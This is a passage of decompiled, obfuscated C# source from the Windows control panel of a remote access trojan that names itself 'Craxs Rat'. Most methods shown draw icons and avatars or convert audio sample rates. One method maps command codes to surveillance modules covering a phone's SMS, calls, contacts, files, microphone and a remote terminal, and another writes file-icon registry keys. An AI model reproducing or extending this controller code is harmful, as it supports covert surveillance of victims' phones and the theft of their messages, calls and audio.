				{
					return WaveFormat.Pcm16Khz16BitMono;
				}
			}
			return WaveFormat.Pcm8Khz16BitMono;
		}

		// Token: 0x06001194 RID: 4500 RVA: 0x000B77D4 File Offset: 0x000B59D4
		public static string smethod_21(int int_0)
		{
			if (int_0 > 16000)
			{
				if (int_0 == 22050)
				{
					return "22050 (Hz)";
				}
				if (int_0 == 32000)
				{
					return "32000 (Hz)";
				}
				if (int_0 == 44100)
				{
					return "44100 (Hz)";
				}
			}
			else
			{
				if (int_0 == 8000)
				{
					return "8000 (Hz)";
				}
				if (int_0 == 11025)
				{
					return "11025 (Hz)";
				}
				if (int_0 == 16000)
				{
					return "16000 (Hz)";
				}
			}
			return "null";
		}

		// Token: 0x06001195 RID: 4501 RVA: 0x000B7854 File Offset: 0x000B5A54
		public static int smethod_22(string string_9)
		{
			int result;
			if (Operators.CompareString(string_9, "8000 (Hz)", false) != 0)
			{
				if (Operators.CompareString(string_9, "11025 (Hz)", false) != 0)
				{
					if (Operators.CompareString(string_9, "16000 (Hz)", false) == 0)
					{
						result = 16000;
					}
					else if (Operators.CompareString(string_9, "22050 (Hz)", false) != 0)
					{
						if (Operators.CompareString(string_9, "32000 (Hz)", false) != 0)
						{
							if (Operators.CompareString(string_9, "44100 (Hz)", false) == 0)
							{
								result = 44100;
							}
							else
							{
								result = 8000;
							}
						}
						else
						{
							result = 32000;
						}
					}
					else
					{
						result = 22050;
					}
				}
				else
				{
					result = 11025;
				}
			}
			else
			{
				result = 8000;
			}
			return result;
		}

		// Token: 0x06001196 RID: 4502 RVA: 0x000B78F0 File Offset: 0x000B5AF0
		public static string smethod_23()
		{
			return Module5.Style_Maps;
		}

		// Token: 0x06001197 RID: 4503 RVA: 0x000B7904 File Offset: 0x000B5B04
		public static Bitmap smethod_24(string string_9)
		{
			int num = Conversions.ToInteger(string_9.Replace("f", ""));
			Bitmap result;
			if (num < 0)
			{
				result = Module0.chrg;
			}
			else if (num > 25)
			{
				if (num > 50)
				{
					if (num <= 80)
					{
						result = Module0.Abov_mid;
					}
					else
					{
						result = Module0.full;
					}
				}
				else
				{
					result = Module0.min;
				}
			}
			else
			{
				result = Module0.low;
			}
			return result;
		}

		// Token: 0x06001198 RID: 4504 RVA: 0x000B7974 File Offset: 0x000B5B74
		public static string smethod_25(string string_9)
		{
			uint num = <PrivateImplementationDetails>_1.ComputeStringHash(string_9);
			if (num > 1408745857U)
			{
				if (num <= 1442301095U)
				{
					if (num != 1425523476U)
					{
						if (num == 1442301095U)
						{
							if (Operators.CompareString(string_9, "gen-5", false) == 0)
							{
								return "info";
							}
						}
					}
					else if (Operators.CompareString(string_9, "gen-4", false) == 0)
					{
						return "files";
					}
				}
				else if (num != 1459078714U)
				{
					if (num == 1475856333U)
					{
						if (Operators.CompareString(string_9, "gen-7", false) == 0)
						{
							return "sms";
						}
					}
				}
				else if (Operators.CompareString(string_9, "gen-6", false) == 0)
				{
					return "microphone";
				}
			}
			else if (num > 1375190619U)
			{
				if (num != 1391968238U)
				{
					if (num == 1408745857U)
					{
						if (Operators.CompareString(string_9, "gen-3", false) == 0)
						{
							return "contacts";
						}
					}
				}
				else if (Operators.CompareString(string_9, "gen-2", false) == 0)
				{
					return "calls";
				}
			}
			else if (num != 1224192048U)
			{
				if (num == 1375190619U)
				{
					if (Operators.CompareString(string_9, "gen-1", false) == 0)
					{
						return "apps";
					}
				}
			}
			else if (Operators.CompareString(string_9, "gen-8", false) == 0)
			{
				return "terminal";
			}
			ProjectData.EndApp();
			string result;
			return result;
		}

		// Token: 0x06001199 RID: 4505 RVA: 0x000B7AC4 File Offset: 0x000B5CC4
		public static void smethod_26(object object_14, object object_15)
		{
			string arg = "DefaultIcon";
			try
			{
				RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(string.Format("{0}\\{1}", object_15, arg), true);
				if (registryKey == null)
				{
					Registry.ClassesRoot.CreateSubKey(string.Format("{0}\\{1}", object_15, arg)).SetValue("", object_14);
					Module11.smethod_0();
				}
				else if (!File.Exists(Conversions.ToString(registryKey.GetValue(""))))
				{
					registryKey.SetValue("", object_14);
					Module11.smethod_0();
				}
			}
			catch (UnauthorizedAccessException ex)
			{
			}
		}

		// Token: 0x0600119A RID: 4506 RVA: 0x000B7B68 File Offset: 0x000B5D68
		public static Bitmap smethod_27(string string_9)
		{
			string left = string_9.Trim();
			Bitmap result;
			if (Operators.CompareString(left, "0", false) != 0)
			{
				if (Operators.CompareString(left, "1", false) != 0)
				{
					if (Operators.CompareString(left, "2", false) != 0)
					{
						if (Operators.CompareString(left, "3", false) == 0)
						{
							result = Module0.OFF;
						}
					}
					else
					{
						result = Module0._on;
					}
				}
				else
				{
					result = Module0.OFF_LOCK;
				}
			}
			else
			{
				result = Module0.ON_LOCK;
			}
			return result;
		}

		// Token: 0x0600119B RID: 4507 RVA: 0x000B7BD4 File Offset: 0x000B5DD4
		private static Bitmap smethod_28(string string_9, object object_15)
		{
			MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(string_9));
			Bitmap image_ = new Bitmap(Image.FromStream(memoryStream));
			memoryStream.Dispose();
			return new Bitmap(Module8.smethod_30(image_));
		}

		// Token: 0x0600119C RID: 4508 RVA: 0x000B7C0C File Offset: 0x000B5E0C
		public static Image smethod_29(Image image_0, Image image_1)
		{
			checked
			{
				try
				{
					Bitmap bitmap = new Bitmap(image_0);
					bitmap.SetResolution(image_1.HorizontalResolution, image_1.VerticalResolution);
					Graphics graphics = Graphics.FromImage(bitmap);
					ImageAttributes imageAttributes = new ImageAttributes();
					ColorMap[] map = new ColorMap[]
					{
						new ColorMap
						{
							OldColor = Color.FromArgb(255, 0, 255, 0),
							NewColor = Color.FromArgb(0, 0, 0, 0)
						}
					};
					imageAttributes.SetRemapTable(map, ColorAdjustType.Bitmap);
					int num = image_0.Width - image_1.Width - 10;
					graphics.DrawImage(image_1, new Rectangle(num + 18, 25, image_1.Width, image_1.Height), 0, 0, image_1.Width, image_1.Height, GraphicsUnit.Pixel, imageAttributes);
					image_1 = bitmap;
					graphics.Dispose();
					return image_1;
				}
				catch (Exception ex)
				{
				}
				return image_0;
			}
		}

		// Token: 0x0600119D RID: 4509 RVA: 0x000B7CF4 File Offset: 0x000B5EF4
		public static Image smethod_30(Image image_0)
		{
			Bitmap bitmap = new Bitmap(image_0.Width, image_0.Height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				GraphicsPath graphicsPath = new GraphicsPath();
				graphics.SmoothingMode = SmoothingMode.AntiAlias;
				graphicsPath.AddEllipse(0, 0, bitmap.Width, bitmap.Height);
				System.Drawing.Region region = new System.Drawing.Region(graphicsPath);
				graphics.Clip = region;
				graphics.DrawImage(image_0, Point.Empty);
				region.Dispose();
				graphicsPath.Dispose();
			}
			image_0.Dispose();
			image_0.Dispose();
			return bitmap;
		}

		// Token: 0x0600119E RID: 4510 RVA: 0x000B7D94 File Offset: 0x000B5F94
		public static Bitmap smethod_31(string string_9, int int_0, int int_1, object object_15)
		{
			string string_10 = Module0.wallpaper.ToString().Trim();
			if (Operators.CompareString(string_9, "-1", false) != 0 | Operators.CompareString(string_9, "", false) == 0)
			{
				byte[] buffer = Convert.FromBase64String(string_9);
				MemoryStream memoryStream = new MemoryStream(buffer);
				Bitmap bitmap = new Bitmap(Image.FromStream(memoryStream));
				int width = bitmap.Size.Width;
				int height = bitmap.Size.Height;
				if (width == int_0 & height == int_1)
				{
					string_10 = string_9;
				}
				bitmap.Dispose();
				memoryStream.Dispose();
			}
			return Module8.smethod_28(string_10, object_15);
		}

		// Token: 0x0600119F RID: 4511 RVA: 0x000B7E38 File Offset: 0x000B6038
		public static Image smethod_32(int int_0, object objects_1)
		{
			checked
			{
				Image result;
				if (int_0 != 0)
				{
					if (int_0 != 1)
					{
						return result;
					}
					Color color = Color.FromArgb(170, (int)Module5.color_0.R, (int)Module5.color_0.G, (int)Module5.color_0.B);
					Pen pen = new Pen(color, 2f);
					using (Bitmap bitmap = new Bitmap(48, 48))
					{
						using (Graphics graphics = Graphics.FromImage(bitmap))
						{
							graphics.SmoothingMode = SmoothingMode.AntiAlias;
							using (TextureBrush textureBrush = new TextureBrush(bitmap))
							{
								textureBrush.TranslateTransform(0f, 0f);
								using (new GraphicsPath())
								{
									using (SolidBrush solidBrush = new SolidBrush(Module8.smethod_33()))
									{
										graphics.FillEllipse(solidBrush, 4, 4, bitmap.Width - 12, bitmap.Height - 12);
									}
									graphics.DrawEllipse(pen, 4, 4, bitmap.Width - 12, bitmap.Height - 12);
								}
							}
							string text = objects_1[0].ToString();
							if (Conversions.ToBoolean(Operators.AndObject(Operators.CompareString(text, "null", false) == 0, Operators.NotObject(Operators.CompareObjectEqual(objects_1[2], null, false)))))
							{
								text = objects_1[1].ToString();
							}
							string s = Strings.Space(1);
							if (text.Trim().Length > 0)
							{
								s = Conversions.ToString(text[0]);
							}
							Rectangle r = new Rectangle(6, 6, bitmap.Width - 15, bitmap.Height - 15);
							StringFormat stringFormat = new StringFormat();
							stringFormat.LineAlignment = StringAlignment.Center;
							stringFormat.Alignment = StringAlignment.Center;
							graphics.DrawString(s, Module8.font_0, new SolidBrush(color), r, stringFormat);
						}
						return new Bitmap(bitmap);
					}
				}
				Color color2 = Color.FromArgb(170, (int)Module5.color_0.R, (int)Module5.color_0.G, (int)Module5.color_0.B);
				Pen pen2 = new Pen(color2, 2f);
				using (Bitmap bitmap2 = new Bitmap(48, 48))
				{
					using (Graphics graphics2 = Graphics.FromImage(bitmap2))
					{
						graphics2.SmoothingMode = SmoothingMode.AntiAlias;
						using (TextureBrush textureBrush2 = new TextureBrush(bitmap2))
						{
							textureBrush2.TranslateTransform(0f, 0f);
							using (new GraphicsPath())
							{
								using (SolidBrush solidBrush2 = new SolidBrush(Module8.smethod_33()))
								{
									graphics2.FillEllipse(solidBrush2, 4, 4, bitmap2.Width - 12, bitmap2.Height - 12);
								}
								graphics2.DrawEllipse(pen2, 4, 4, bitmap2.Width - 12, bitmap2.Height - 12);
							}
						}
						Image image_ = new Bitmap(objects_1[0].ToString());
						graphics2.DrawImage(Module8.smethod_34(image_, Color.FromArgb(190, 190, 190), color2), Conversions.ToInteger(objects_1[1]), Conversions.ToInteger(objects_1[2]), Conversions.ToInteger(objects_1[3]), Conversions.ToInteger(objects_1[4]));
					}
					result = new Bitmap(bitmap2);
				}
				return result;
			}
		}

		// Token: 0x060011A0 RID: 4512 RVA: 0x000B8278 File Offset: 0x000B6478
		private static Color smethod_33()
		{
			return Module5.White;
		}

		// Token: 0x060011A1 RID: 4513 RVA: 0x000B828C File Offset: 0x000B648C
		public static Bitmap smethod_34(Image image_0, Color color_0, Color color_1)
		{
			float[][] array = new float[5][];
			int num = 0;
			float[] array2 = new float[5];
			array2[0] = 1f;
			array[num] = array2;
			int num2 = 1;
			float[] array3 = new float[5];
			array3[1] = 1f;
			array[num2] = array3;
			int num3 = 2;
			float[] array4 = new float[5];
			array4[2] = 1f;
			array[num3] = array4;
			int num4 = 3;
			float[] array5 = new float[5];
			array5[3] = 1f;
			array[num4] = array5;
			array[4] = checked(new float[]
			{
				(float)(color_1.R - color_0.R) / 255f,
				(float)(color_1.G - color_0.G) / 255f,
				(float)(color_1.B - color_0.B) / 255f,
				0f,
				1f
			});
			ColorMatrix colorMatrix = new ColorMatrix(array);
			ImageAttributes imageAttributes = new ImageAttributes();
			imageAttributes.SetColorMatrix(colorMatrix);
			Bitmap bitmap = new Bitmap(image_0.Width, image_0.Height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.DrawImage(image_0, new Rectangle(0, 0, image_0.Width, image_0.Height), 0, 0, image_0.Width, image_0.Height, GraphicsUnit.Pixel, imageAttributes);
			}
			return bitmap;
		}

		// Token: 0x040009AC RID: 2476
		public static Font font_0 = null;

		// Token: 0x040009AD RID: 2477
		public static Font font_1 = null;

		// Token: 0x040009AE RID: 2478
		public static readonly string string_0 = Application.StartupPath + "\\";

		// Token: 0x040009AF RID: 2479
		public static readonly string string_1 = Application.StartupPath + "\\res";

		// Token: 0x040009B0 RID: 2480
		public static readonly string string_2 = Application.StartupPath + "\\res\\Icons\\Apps";

		// Token: 0x040009B1 RID: 2481
		public static readonly string string_3 = Application.StartupPath + "\\res\\Store";

		// Token: 0x040009B2 RID: 2482
		public static readonly string string_4 = "plugens.angel.plugens";

		// Token: 0x040009B3 RID: 2483
		public static readonly string Users = "Users";

		// Token: 0x040009B4 RID: 2484
		public static readonly string string_5 = "Craxs Rat";

		// Token: 0x040009B5 RID: 2485
		public static StringBuilder stringBuilder_0;

		// Token: 0x040009B6 RID: 2486
		public static List<object> objects_0;

		// Token: 0x040009B7 RID: 2487
		public static string string_6;

		// Token: 0x040009B8 RID: 2488
		public static string string_7;

		// Token: 0x040009B9 RID: 2489
		public static string string_8;
	}
}
